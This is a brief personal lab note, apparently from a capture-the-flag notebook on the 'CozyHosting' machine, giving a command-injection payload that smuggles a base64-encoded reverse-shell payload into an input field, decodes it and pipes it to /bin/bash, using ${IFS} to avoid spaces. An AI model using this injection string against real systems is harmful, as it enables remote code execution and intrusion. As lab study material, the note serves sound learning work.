Reference: [[m CozyHosting]]


- Use this in the input filed where command injection is 

```
;echo${IFS}<base64 encoded payload>|base64${IFS}-d|/bin/bash;
```

- we can get the payload from shellgen

- `${IFS}`: This is a variable representing the Internal Field Separator. The IFS is used by the shell to determine how to separate words and lines in a command. By default, it includes space, tab, and newline.
- IFS was use in the example because white spaces was giving an error